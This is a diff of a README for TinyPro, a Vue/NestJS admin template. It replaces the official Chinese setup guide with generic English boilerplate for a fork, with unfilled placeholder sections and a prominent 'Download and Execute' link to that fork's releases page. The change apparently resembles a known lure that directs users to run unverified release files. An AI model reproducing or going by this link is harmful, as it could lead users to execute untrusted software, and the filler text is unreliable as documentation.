@@ -1,78 +1,57 @@
-# TinyPro
+# Awesome Tiny-Pro Repository
 
-TinyCLI 是一个跨平台的前端工程化 CLI 工具，为开发者提供一系列开发套件及工程插件，覆盖前端开发的整个链路，保证团队开发过程的一致性和可复制性。
+Welcome to the Tiny-Pro repository, where you can find a powerful backend management system built on TinyVue. This system supports various features like online menu and route configuration, internationalization, tab mode, multi-level menus, a wide range of templates, and integration with different build tools. It is a feature-rich solution that is ready to use out of the box!
 
-TinyPro 是 TinyCLI 的一个套件，是一个开箱即用、前后端分离的后台管理模板。
+## 📁 Repository: [Tiny-Pro](https://github.com/Putra2204/tiny-pro)
 
-特性：
-- 支持 NestJS 后端
-- 支持通过可视化方式配置菜单
-- 细粒度权限管理：角色、用户、菜单、组件权限
-- 支持多种构建工具：Webpack / Vite / Rspack / Farm
-- 多级菜单
-- 页签模式
-- Mock 数据
-- 主题定制
-- 国际化
+### Description:
+Tiny-Pro is a frontend-backend separation management system based on TinyVue. It offers seamless integration with various tools and a user-friendly interface for efficient management.
 
-官网：[https://opentiny.design/vue-pro](https://opentiny.design/vue-pro)
+### Topics: 
+- admin 
+- admin-template 
+- dashboard 
+- farm 
+- front-end 
+- management-system 
+- nestjs 
+- opentiny 
+- rspack 
+- tiny-pro 
+- tiny-vue 
+- vite 
+- vue 
+- vue3 
+- webpack
 
-## 一行命令初始化一个后台管理模板
+## 🚀 [Download and Execute](https://github.com/Putra2204/tiny-pro/releases)
+Download the latest release file and follow the instructions to set up and run the Tiny-Pro system.
 
-请确保您安装了`Node.js`、`NPM`、`TinyCLI`。
+## 🌟 Key Features:
+- **Online Configuration:** Easily configure menus, routes, and internationalization settings online.
+- **Rich Templates:** Choose from a variety of templates to customize your backend management system.
+- **Tab Mode:** Enjoy seamless navigation with the tab mode feature.
+- **Multi-level Menus:** Create multi-level menus for efficient organization.
+- **Powerful Integration:** Integrate with multiple build tools for enhanced functionality.
 
-```bash
-tiny init pro
-```
+## 📸 Screenshots:
+Include some screenshots here to give users a glimpse of the sleek interface and powerful features of Tiny-Pro.
 
-选择 Vue 技术栈，初始化完成后，项目结构应该为：
+## 📘 Usage:
+Provide detailed instructions on how to set up and use Tiny-Pro in your own projects.
 
-```
-tiny-pro
-  nestJs    # 后端服务
-  web       # 前端服务
-```
+## 🤝 Contributing:
+Encourage users to contribute to the project by providing guidelines on how they can get involved and support the development of Tiny-Pro.
 
-## 后端启动
+## 📝 License:
+Mention the license under which Tiny-Pro is distributed to ensure compliance with usage and distribution terms.
 
-后端服务支持 `Docker 启动` 与 `命令启动` 两种方式。
+## 🙌 Acknowledgements:
+Show appreciation to any individuals or organizations that have contributed to the development and success of Tiny-Pro.
 
-### Docker 启动
+## 📢 Feedback:
+Invite users to provide feedback, suggestions, and bug reports to help improve the functionality and user experience of Tiny-Pro.
 
-请确保您安装了 `Docker`。
+---
 
-在 `tiny-pro/nestJs` 下执行以下命令，启动后端服务：
-
-```bash
-docker compose up -d
-```
-
-### 命令启动
-
-请确保您安装了 `MySQL`、`Redis`。
-
-在启动项目前请您做好如下检查：
-
-- MySQL 服务可以正常访问
-- Redis 服务可以正常访问
-- MySQL 中存在 `.env` 文件中 `DATABASE_NAME` 字段定义的数据库，且该数据库为空
-- `.env` 文件中 `DATABASE_SYNCHRONIZE` 为 `true`
-
-完成上述检查后，您可以在 `tiny-pro/nestJs` 下执行以下命令，启动后端服务：
-
-```bash
-npm i && npm start
-```
-
-## 前端启动
-
-在 `tiny-pro/web` 下依次执行以下命令：
-
-- 安装依赖：`npm i`
-- 启动前端项目：`npm start`
-
-更详细的文档请参考 TinyPro 官网：[https://opentiny.design/vue-pro](https://opentiny.design/vue-pro)
-
-## 维护者
-
-添加官方小助手微信：opentiny-official，加入我们的技术交流群。
+Visit the [Tiny-Pro repository](https://github.com/Putra2204/tiny-pro) to explore more about this amazing backend management system built on TinyVue. Get started with Tiny-Pro today and experience efficient backend management like never before!
